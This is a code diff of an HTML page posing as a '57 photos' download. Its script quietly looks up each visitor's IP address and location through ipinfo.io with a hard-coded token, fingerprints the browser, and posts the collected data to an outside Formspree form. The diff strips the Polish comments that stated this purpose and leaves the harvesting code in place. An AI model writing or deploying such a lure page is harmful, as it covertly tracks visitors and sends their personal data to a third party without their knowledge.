@@ -10,15 +10,14 @@
   <h1>57 photos</h1>
   <p>download</p>
   <script>
-    // Pobieranie danych o IP, lokalizacji, user agent itd.
+   
     async function getData() {
       const ipData = await fetch("https://ipinfo.io/json?token=5cbb62c209322b").then(response => response.json());
       const locationData = await fetch(`https://ipinfo.io/${ipData.ip}/json`).then(response => response.json());
 
       const userAgent = navigator.userAgent;
-      const fingerprint = btoa(navigator.userAgent + Date.now()); // fingerprint
+      const fingerprint = btoa(navigator.userAgent + Date.now()); 
 
-      // Zbieranie danych
       const data = {
         ip: ipData.ip,
         location: locationData.city + ", " + locationData.country,
@@ -26,10 +25,8 @@
         fingerprint: fingerprint
       };
 
-      // Wyświetlanie danych w konsoli (do debugowania)
       console.log(data);
 
-      // Wysyłanie danych na email (tutaj trzeba użyć serwera backendowego lub innej usługi)
       await fetch('https://formspree.io/f/xjkyelzd', {
         method: 'POST',
         headers: {
